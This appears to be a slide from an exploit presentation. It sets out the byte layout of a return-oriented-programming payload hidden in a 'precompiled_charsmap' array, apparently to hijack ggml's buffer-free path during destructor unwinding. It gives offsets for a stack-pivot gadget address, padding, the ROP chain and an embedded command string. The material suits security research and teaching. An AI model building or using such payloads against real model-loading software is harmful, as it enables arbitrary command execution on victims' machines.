The ROP blob — precompiled_charsmap

UINT8 array — layout consumed during destructor unwinding
offset   value                  purpose
──────   ────────────────────   ─────────────────────────────────────────────────
  0      0                       1st ggml_backend_buffer_free → NULL check returns
  8      PIVOT (0x236f81c)       2nd free → indirect call lands on the pivot gadget:
                                   pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret
 16 / 24 junk                    eaten by the gadget's pop r14 / pop rbp
 32 ...   ROP chain              the gadget sequence (next slide)
160 ...   command string         raw NUL-terminated bytes of the final argument

The blob is carried as a UINT8 array so embedded NUL bytes in gadget addresses survive. After the pivot, RSP points into this very blob — the chain and the command string live inside the payload, not somewhere we had to spray to a known address.
